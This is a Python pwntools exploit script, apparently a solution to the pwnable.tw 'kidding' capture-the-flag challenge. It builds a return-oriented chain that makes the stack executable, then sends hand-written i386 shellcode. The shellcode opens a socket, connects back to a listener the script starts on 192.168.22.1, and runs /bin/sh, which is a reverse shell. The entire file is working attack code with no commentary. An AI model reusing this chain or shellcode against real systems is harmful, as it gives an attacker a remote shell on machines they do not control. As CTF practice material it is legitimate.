from pwn import *
ip="0.0.0.0"
#ip="192.168.22.143"
ip="192.168.22.1"
listener = listen(0x6600)
#p=remote("chall.pwnable.tw",10303)
p=remote("0.0.0.0",1025)
#p=process("./kidding")
p=remote("0.0.0.0",1025)
int0x80=0x0806f28f
eax=0x080b8536
dcb=0x0806ecb0
offset=12
edx=0x0806ec8b
ecx=0x080583c9
_dl_make_stack_executable=0x809A080
__libc_stack_end=0x80e9fc8
__stack_prot=0x80e9fec
jmp_eax=0x08050184
push_esp=0x080b8546
call_esp=0x080c99b0
do_set=0x0804b5eb #: pop dword ptr [ecx] ; ret

#goto 0x080488A3
shellcode='''
mov al,0x66
cdq
push edx
push 1
pop ebx
push ebx
push 2
mov ecx,esp
int 0x80
'''
shellcode+='''
pop esi
pop ecx
xchg   ebx,eax
mov al,0x3f
int 0x80
'''
shellcode+='''
mov al,0x66
push ebp
push ax
push si
mov ecx,esp
push cs
push ecx
push ebx
mov    bl,0x3
mov ecx,esp
int 0x80
'''
shellcode+='''
mov al,0xb
pop ecx
push 0x0068732f
push 0x6e69622f
mov    ebx,esp
int 0x80
'''

context.arch='i386'
shellcode=asm(shellcode)


"""
gdb.attach(p,'''
b *0x80c99b0
c
''')
"""
payload='\x00'*8+binary_ip(ip)
payload+=p32(ecx)+p32(__stack_prot)+p32(do_set)+p32(7)+p32(eax)+p32(__libc_stack_end)+p32(_dl_make_stack_executable)+p32(call_esp)
payload+=shellcode

print len(payload)
context.log_level='debug'
assert(len(payload)<=100)
p.send(payload)
listener.interactive()
